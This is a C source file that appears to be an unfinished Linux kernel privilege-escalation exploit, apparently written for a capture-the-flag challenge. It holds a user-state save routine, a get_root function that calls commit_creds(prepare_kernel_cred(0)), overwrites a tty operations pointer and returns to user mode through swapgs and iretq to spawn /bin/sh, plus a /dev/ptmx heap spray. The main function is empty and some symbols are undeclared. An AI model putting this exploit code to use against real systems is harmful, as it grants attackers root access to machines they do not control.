#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <pthread.h>
#include <unistd.h>




char* user_stack;
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
    __asm__("mov %0, cs\n"
            "mov %1, ss\n"
            "pushfq\n"
            "popq %2\n"
            :"=r"(user_cs),"=r"(user_ss),"=r"(user_rflags)
            :
            :"memory"
    );
}

void launch_shell(void) {
    system("/bin/sh");
}

void get_root(void) {
    commit_creds(prepare_kernel_cred(0));

    unsigned long* a = n_tty_ops + 0x40;
    *a = (kernel_base + 0x50eee0);

    __asm__("swapgs\n"
        "mov rax, %0\n"
        "push rax\n"
        "mov rax, %1\n"
        "push rax\n"
        "mov rax, %2\n"
        "push rax\n"
        "mov rax, %3\n"
        "push rax\n"
        "mov rax, %4\n"
        "push rax\n"
        "iretq\n"
        :
        :"r"(user_ss),"r"(user_stack),"r"(user_rflags),"r"(user_cs),"r"(launch_shell)
        :"memory"
    );
}


int fd;
int ptmx_fds[0x100];

void open_ptmx(void) {
    for (int i=0; i<0x100; i++)
        ptmx_fds[i] = open("/dev/ptmx", O_NOCTTY|O_RDWR);
}

void close_ptmx(void) {
    for (int i=0; i<0x100; i++)
        close(ptmx_fds[i]);
}


int main(void) {

    return 0;
}
